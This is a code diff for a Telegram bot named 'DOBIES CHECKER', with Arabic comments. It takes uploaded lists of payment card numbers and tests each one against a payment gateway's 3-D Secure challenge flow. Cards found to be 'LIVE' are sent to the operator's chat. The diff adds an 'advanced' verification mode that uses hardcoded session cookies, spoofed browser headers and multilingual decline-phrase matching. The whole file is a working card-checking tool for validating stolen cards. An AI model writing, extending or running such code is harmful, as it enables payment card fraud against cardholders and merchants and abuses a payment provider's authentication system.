@@ -172,11 +172,14 @@ def get_user_stats(user_id):
             'last_response': 'Waiting...',
             'cards_checked': 0,
             'success_cards': [],
+            'advanced_mode': False,  # وضع الفحص المتقدم
+            'advanced_declined': 0,  # عدد البطاقات المرفوضة بتحقق إضافي
         }
     return user_sessions[user_id]
 
 def reset_user_stats(user_id):
     if user_id in user_sessions:
+        advanced_mode = user_sessions[user_id].get('advanced_mode', False)
         user_sessions[user_id].update({
             'total': 0,
             'checking': 0,
@@ -189,6 +192,8 @@ def reset_user_stats(user_id):
             'last_response': 'Waiting...',
             'cards_checked': 0,
             'success_cards': [],
+            'advanced_mode': advanced_mode,
+            'advanced_declined': 0,
         })
 
 # ========== HELPERS ==========
@@ -260,111 +265,90 @@ async def get_guid_with_retry(loop, stats, max_retries=2):
     return None
 
 
-# ========== CUSTOM VERIFICATION ==========
-async def custom_verification(encoded_creq, challenge_url, threeDSSessionData, loop):
+# ========== ADVANCED VERIFICATION - التحقق الإضافي ==========
+async def advanced_verification(encoded_creq, challenge_url, threeDSSessionData, loop):
+    """
+    يقوم بالتحقق الإضافي من خلال إرسال طلب لـ arcot.com
+    يرجع True إذا كانت البطاقة مرفوضة (Payment went wrong)
+    يرجع False إذا كان هناك خطأ أو البطاقة ليست مرفوضة بشكل واضح
+    """
     try:
-        from urllib.parse import urlparse
+        cookies = {
+            'ProxyRACookie': 'c48a0328-4840-4f9c-ab9c-38f329379071',
+            'RiskfortCookie': '"x=s1:elsFP1Ukr8aWD+GGg551u0ccgKIIuluJz4/cjmfuxCW2R2LAqdmclypuxrUAJ+6H"',
+            'RiskfortTLCCookie': '"x=s1:DcWhqNCRt07/WC8uuIWYEBRI4YD5x5YjG1LKmuiHd5oIgMxShM9iPR3NaR5toAaR"',
+            'TransitionCookie': '"x=s1:DcWhqNCRt07/WC8uuIWYEBRI4YD5x5YjG1LKmuiHd5oIgMxShM9iPR3NaR5toAaR"',
+            '_cfuvid': 'WCjUVZtrhcxRenwTUTyqcJ_LUVQy.F7BcFBcT1O28Zo-1771969869822-0.0.1.1-604800000',
+            '__cflb': '0H28vZL7wce6gLgoY8aSnAZQ2PQZdETgXQWc2hsU5nu',
+        }
 
-        # STEP 1: إرسال creq → جيب صفحة CardholderSelect
-        s = requests.Session()
-        r1 = await loop.run_in_executor(None, lambda: s.post(
-            challenge_url,
-            headers={
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                'content-type': 'application/x-www-form-urlencoded',
-                'origin': 'https://pay.realexpayments.com',
-                'referer': 'https://pay.realexpayments.com/',
-                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/146.0.0.0 Safari/537.36',
-                'upgrade-insecure-requests': '1',
-            },
-            data={'creq': encoded_creq, 'threeDSSessionData': threeDSSessionData or ''},
-            timeout=20,
-            allow_redirects=True,
-        ))
+        headers = {
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+            'content-type': 'application/x-www-form-urlencoded',
+            'dnt': '1',
+            'origin': 'https://pay.realexpayments.com',
+            'priority': 'u=0, i',
+            'referer': 'https://pay.realexpayments.com/',
+            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'iframe',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'cross-site',
+            'sec-fetch-storage-access': 'active',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
+        }
 
-        html1 = r1.text
-        parsed = urlparse(r1.url)
-        base_url = f"{parsed.scheme}://{parsed.netloc}"
+        data = {
+            'creq': encoded_creq,
+            'threeDSSessionData': threeDSSessionData,
+        }
 
-        m_issuer = re.search(r'name="IssuerId"[^>]*value="([^"]+)"', html1)
-        m_txn    = re.search(r'name="TransactionId"[^>]*value="([^"]+)"', html1)
-        issuer_id = m_issuer.group(1) if m_issuer else ''
-        txn_id    = m_txn.group(1) if m_txn else ''
-
-        # STEP 2: ChooseCardholder → JSON فيه NextStep
-        r2 = await loop.run_in_executor(None, lambda: s.post(
-            f"{base_url}/Api/2_1_0/NextStep/ChooseCardholder",
-            headers={
-                'accept': 'application/json, text/javascript, */*; q=0.01',
-                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'origin': base_url,
-                'referer': r1.url,
-                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/146.0.0.0 Safari/537.36',
-                'x-http-method-override': 'FORM',
-                'x-requested-with': 'XMLHttpRequest',
-            },
-            data={
-                'CardholderId': 'P',
-                'Name': '',
-                'TransactionId': txn_id,
-                'CardholderSelectionTimeout': '',
-                'CardholderSelectType': '',
-                'IssuerId': issuer_id,
-            },
-            timeout=20,
-        ))
-
-        resp_json = r2.json()
-        next_step = resp_json.get('NextStep', '').upper()
-        next_type = resp_json.get('Type', '').upper()
-        print(f"[*] ChooseCardholder → NextStep: {next_step} | Type: {next_type}")
-
-        # لو FAILWITHFEEDBACK مباشرة = DECLINE
-        if next_step == 'FAILWITHFEEDBACK':
-            return False
-
-        # لو VALIDATE + OUTOFBAND = محتاج نكمل للـ VALIDATE
-        if next_step == 'VALIDATE' and next_type == 'OUTOFBAND':
-            # STEP 3: VALIDATE → صفحة SC Mobile
-            r3 = await loop.run_in_executor(None, lambda: s.post(
-                f"{base_url}/2_1_0/VALIDATE/{issuer_id}",
-                headers={
-                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                    'content-type': 'application/x-www-form-urlencoded',
-                    'origin': base_url,
-                    'referer': r1.url,
-                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/146.0.0.0 Safari/537.36',
-                    'upgrade-insecure-requests': '1',
-                },
-                data={
-                    'TransactionId': txn_id,
-                    'GroupId': 'Visa',
-                    'Type': 'OUTOFBAND',
-                    'LanguageCode': 'en-us',
-                    'CardBrand': 'Visa',
-                    'Content.TemplateName': 'Cardholderselection',
-                    'Content.WorkflowScreenName': 'cardholderselection',
-                    'NextStepChoiceType': '',
-                    'IssuerId': issuer_id,
-                    'languageCode': 'ar',
-                },
+        # إرسال الطلب
+        response = await loop.run_in_executor(
+            None,
+            lambda: requests.post(
+                challenge_url,
+                cookies=cookies,
+                headers=headers,
+                data=data,
                 timeout=20,
-                allow_redirects=True,
-            ))
-            # لو صفحة SC Mobile ظهرت = LIVE ✅
-            if 'sc mobile app' in r3.text.lower():
-                print(f"[+] SC Mobile page found → LIVE ✅")
-                return True
-            print(f"[!] VALIDATE page unexpected → DECLINE ❌")
-            return False
+            )
+        )
 
-        # أي حاجة تانية = DECLINE
+        # البحث عن علامات الرفض في الـ HTML
+        html_text = response.text.lower()
+        
+        # علامات الرفض المختلفة (بلغات متعددة)
+        decline_indicators = [
+            'payment went wrong',
+            'mobile number isn\'t registered',
+            'need to register your mobile',
+            'transaction failed',
+            'payment failed',
+            'declined',
+            'not authorized',
+            '支付失败',  # صيني
+            '失败',
+            'paiement échoué',  # فرنسي
+            'zahlung fehlgeschlagen',  # ألماني
+        ]
+
+        # فحص وجود أي من علامات الرفض
+        for indicator in decline_indicators:
+            if indicator in html_text:
+                print(f"[!] Advanced Check: Found decline indicator - {indicator}")
+                return True
+        
         return False
 
     except Exception as e:
-        print(f"[-] custom_verification error: {e}")
+        print(f"[-] خطأ في التحقق الإضافي: {e}")
         return False
-
 
 
 # ========== CHECK CARD ==========
@@ -441,23 +425,39 @@ async def check_card(card, bot_app, user_id):
         threeDSSessionData = verify_result.get('threeDSSessionData')
 
         if encoded_creq:
-            if not challenge_url:
-                stats['failed'] += 1
-                stats['last_response'] = 'DECLINE (no challenge url)'
-                return card, "DECLINE"
-
-            is_live = await custom_verification(encoded_creq, challenge_url, threeDSSessionData, loop)
-
-            if is_live:
+            # البطاقة عندها 3D - نفحص لو الوضع المتقدم مفعّل
+            
+            # التحقق الإضافي (إذا كان الوضع المتقدم مفعّل)
+            if stats.get('advanced_mode') and challenge_url:
+                print(f"[*] Advanced mode - verifying 3D card {cc[:6]}****{cc[-4:]}...")
+                is_declined = await advanced_verification(
+                    encoded_creq, 
+                    challenge_url, 
+                    threeDSSessionData, 
+                    loop
+                )
+                
+                if is_declined:
+                    # البطاقة 3D لكن مرفوضة بعد التحقق الإضافي
+                    stats['advanced_declined'] += 1
+                    stats['failed'] += 1
+                    stats['last_response'] = 'ADV-DECLINED (3D Failed) ❌'
+                    print(f"[!] Card {cc[:6]}****{cc[-4:]} - 3D but declined after verification!")
+                    return card, "DECLINE"
+                else:
+                    # البطاقة 3D وناجحة
+                    stats['success_3ds'] += 1
+                    stats['success_cards'].append(card)
+                    stats['last_response'] = '3D ✅ (Verified)'
+                    await send_result(bot_app, card, "3D", user_id)
+                    return card, "3D"
+            else:
+                # وضع عادي - نعتبرها 3D مباشرة
                 stats['success_3ds'] += 1
                 stats['success_cards'].append(card)
-                stats['last_response'] = '3D ✅ LIVE'
-                await send_result(bot_app, card, user_id)
+                stats['last_response'] = '3D ✅'
+                await send_result(bot_app, card, "3D", user_id)
                 return card, "3D"
-            else:
-                stats['failed'] += 1
-                stats['last_response'] = 'DECLINE ❌'
-                return card, "DECLINE"
         else:
             # البطاقة مرفوضة بدون 3D
             result_code = (data.get('data', {}) or {}).get('response', {}) or {}
@@ -473,17 +473,25 @@ async def check_card(card, bot_app, user_id):
         return card, "ERROR"
 
 
-async def send_result(bot_app, card, user_id):
+async def send_result(bot_app, card, status_type, user_id):
     stats = get_user_stats(user_id)
-    text = (
-        f"✅ *3D SECURE - LIVE*\n"
-        f"━━━━━━━━━━━━━━━━\n"
-        f"💳 `{card}`\n"
-        f"━━━━━━━━━━━━━━━━\n"
-        f"🟢 *Status:* LIVE\n"
-        f"📱 *SC Mobile Auth:* Confirmed ✅"
-    )
-    await bot_app.bot.send_message(chat_id=stats['chat_id'], text=text, parse_mode='Markdown')
+    if status_type == "3D":
+        mode_text = "🔍 ADVANCED (Verified)" if stats.get('advanced_mode') else "⚡ STANDARD"
+        verification_note = "\n✅ *Passed Advanced Verification*" if stats.get('advanced_mode') else ""
+        
+        text = (
+            f"✅ *3D SECURE*\n"
+            f"━━━━━━━━━━━━━━━━\n"
+            f"💳 `{card}`\n"
+            f"━━━━━━━━━━━━━━━━\n"
+            f"🟢 *Status:* LIVE - 3D Enrolled\n"
+            f"📊 *Mode:* {mode_text}{verification_note}"
+        )
+        await bot_app.bot.send_message(
+            chat_id=stats['chat_id'],
+            text=text,
+            parse_mode='Markdown'
+        )
 
 # ========== DASHBOARD ==========
 def create_dashboard_keyboard(user_id):
@@ -494,6 +502,10 @@ def create_dashboard_keyboard(user_id):
     mins, secs = divmod(elapsed, 60)
     hours, mins = divmod(mins, 60)
 
+    # إضافة معلومات الوضع المتقدم
+    mode_icon = "🔍" if stats.get('advanced_mode') else "⚡"
+    mode_text = "ADV" if stats.get('advanced_mode') else "STD"
+
     keyboard = [
         [InlineKeyboardButton(f"🔥 Total: {stats['total']}", callback_data="noop")],
         [
@@ -501,15 +513,21 @@ def create_dashboard_keyboard(user_id):
             InlineKeyboardButton(f"⏱ {hours:02d}:{mins:02d}:{secs:02d}", callback_data="noop"),
         ],
         [
-            InlineKeyboardButton(f"✅ Live: {stats['success_3ds']}", callback_data="noop"),
+            InlineKeyboardButton(f"✅ 3DS: {stats['success_3ds']}", callback_data="noop"),
             InlineKeyboardButton(f"❌ Declined: {stats['failed']}", callback_data="noop"),
         ],
         [
             InlineKeyboardButton(f"🚫 Errors: {stats['errors']}", callback_data="noop"),
             InlineKeyboardButton(f"📊 Done: {stats['cards_checked']}/{stats['total']}", callback_data="noop"),
         ],
-        [InlineKeyboardButton(f"📡 {stats['last_response']}", callback_data="noop")],
+        [InlineKeyboardButton(f"{mode_icon} Mode: {mode_text} | 📡 {stats['last_response']}", callback_data="noop")],
     ]
+
+    # إضافة معلومات التحقق الإضافي إذا كان الوضع المتقدم مفعّل
+    if stats.get('advanced_mode') and stats.get('advanced_declined', 0) > 0:
+        keyboard.append([
+            InlineKeyboardButton(f"🔍 Adv. Declined: {stats['advanced_declined']}", callback_data="noop")
+        ])
 
     if stats['current_card']:
         keyboard.append([InlineKeyboardButton(f"🔍 {stats['current_card']}", callback_data="noop")])
@@ -633,28 +651,32 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("الملف فاضي!")
         return
 
-    reset_user_stats(user_id)
-    stats.update({
-        'total': len(cards),
-        'start_time': datetime.now(),
-        'is_running': True,
-        'chat_id': update.message.chat_id,
-    })
-
-    dashboard_msg = await update.message.reply_text(
-        f"📊 *DOBIES CHECKER*\n🚀 جاري فحص {len(cards)} كرت...",
-        reply_markup=create_dashboard_keyboard(user_id),
+    # عرض خيار الفحص (عادي أو متقدم)
+    keyboard = [
+        [
+            InlineKeyboardButton("⚡ فحص عادي (سريع)", callback_data=f"check_mode:standard:{len(cards)}"),
+            InlineKeyboardButton("🔍 فحص متقدم (دقيق)", callback_data=f"check_mode:advanced:{len(cards)}"),
+        ]
+    ]
+    
+    # حفظ الكروت مؤقتاً
+    context.user_data['pending_cards'] = cards
+    
+    await update.message.reply_text(
+        "🎯 *اختر نوع الفحص:*\n\n"
+        "⚡ *فحص عادي:* سريع - يفحص 3D فقط\n"
+        "🔍 *فحص متقدم:* دقيق - يفحص 3D + تحقق إضافي للرفض\n\n"
+        f"📊 عدد الكروت: {len(cards)}",
+        reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
-    stats['dashboard_message_id'] = dashboard_msg.message_id
-
-    asyncio.create_task(process_cards(cards, context.application, user_id))
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     if query.from_user.id not in ADMIN_IDS:
         await query.answer("Unauthorized", show_alert=True)
         return
+    
     try:
         await query.answer()
     except Exception:
@@ -663,6 +685,59 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = query.from_user.id
     stats = get_user_stats(user_id)
 
+    # التعامل مع اختيار نوع الفحص
+    if query.data.startswith("check_mode:"):
+        parts = query.data.split(":")
+        mode = parts[1]  # standard أو advanced
+        card_count = int(parts[2])
+        
+        # جلب الكروت المحفوظة
+        cards = context.user_data.get('pending_cards', [])
+        if not cards:
+            await context.bot.send_message(
+                chat_id=query.message.chat_id,
+                text="❌ خطأ: الكروت غير موجودة. جرب تبعت الملف تاني.",
+                parse_mode='Markdown'
+            )
+            return
+        
+        # تعيين الوضع
+        reset_user_stats(user_id)
+        stats['advanced_mode'] = (mode == 'advanced')
+        stats.update({
+            'total': len(cards),
+            'start_time': datetime.now(),
+            'is_running': True,
+            'chat_id': query.message.chat_id,
+        })
+        
+        mode_text = "🔍 فحص متقدم (Advanced)" if stats['advanced_mode'] else "⚡ فحص عادي (Standard)"
+        
+        # تعديل الرسالة
+        await query.edit_message_text(
+            f"✅ تم اختيار: *{mode_text}*\n"
+            f"📊 عدد الكروت: {len(cards)}\n"
+            f"🚀 جاري بدء الفحص...",
+            parse_mode='Markdown'
+        )
+        
+        # إنشاء لوحة المعلومات
+        dashboard_msg = await context.bot.send_message(
+            chat_id=query.message.chat_id,
+            text=f"📊 *DOBIES CHECKER* 📊\n{mode_text}",
+            reply_markup=create_dashboard_keyboard(user_id),
+            parse_mode='Markdown'
+        )
+        stats['dashboard_message_id'] = dashboard_msg.message_id
+        
+        # بدء الفحص
+        asyncio.create_task(process_cards(cards, context.application, user_id))
+        
+        # حذف الكروت المؤقتة
+        del context.user_data['pending_cards']
+        return
+
+    # التعامل مع إيقاف الفحص
     if query.data == "stop_check" and stats['is_running']:
         stats['is_running'] = False
         stats['last_response'] = 'Stopped'
